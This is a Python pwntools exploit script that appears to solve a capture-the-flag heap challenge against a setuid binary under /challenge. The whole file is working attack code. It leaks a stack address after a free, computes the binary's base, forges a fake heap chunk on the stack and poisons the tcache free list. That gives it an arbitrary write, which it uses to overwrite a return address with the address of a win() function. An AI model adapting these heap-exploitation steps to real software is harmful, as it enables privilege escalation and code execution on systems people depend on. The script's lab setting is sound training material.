import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    def read_argv(offset):
        io.sendline(b"malloc 0 32")
        io.sendline(b"free 0")
        io.sendline(b"echo 0 %d" % offset)
        io.recvuntil(b"Data: ")
        return pwn.u64(io.recvline(False).ljust(8, b"\x00"))

    addrof_stack_string = read_argv(0)
    pwn.success(f"Address of string on stack: {hex(addrof_stack_string)}")

    elf = io.elf
    elf.address = addrof_stack_string - next(elf.search(b"/bin/echo\0"))
    win_addr = elf.symbols["win"]
    pwn.success(f"Address of win(): {hex(win_addr)}")

    def write_qword(addr, value):
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 1 16")
        io.sendline(b"free 0")
        io.sendline(b"free 1")
        io.sendline(b"scanf 1")
        io.sendline(addr.to_bytes(8, "little"))
        io.sendline(b"malloc 0 16")
        io.sendline(b"malloc 1 16")
        io.sendline(b"scanf 1")
        io.sendline(value.to_bytes(8, "little"))

    def read_echo(idx, offset):
        io.sendline(b"echo %d %d" % (idx, offset))
        io.recvuntil(b"Data: ")
        return io.recvline(False)

    def leak_addrof_free(rbp_scanf, rbp_free, block_size=0x20):
        offset_tofree = rbp_scanf - rbp_free  # offset from scanf to free ptr
        assert offset_tofree < 128
        io.sendline(b"stack_scanf")
        io.sendline(
            pwn.flat(
                {
                    offset_tofree - 0x10: 0x00,  # PREV_SIZE
                    offset_tofree - 0x08: block_size | 0x1,  # SIZE
                }
            )
        )
        io.sendline(b"malloc 0 16")
        io.sendline(b"stack_free")
        io.sendline(b"free 0")

        return pwn.u64(read_echo(0, 0)[:8].ljust(8, b"\x00"))

    rbp_scanf = 0x90
    rbp_free = 0x50
    addrof_free = leak_addrof_free(rbp_scanf, rbp_free)
    pwn.success(f"Address of stack_free on stack: {hex(addrof_free)}")

    addrof_return = addrof_free + rbp_free + 0x8
    pwn.success(f"Address of return address on stack: {hex(addrof_return)}")
    
    # hard side need to bypass white space sanitization on scanf
    write_qword(addrof_return, win_addr)
    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
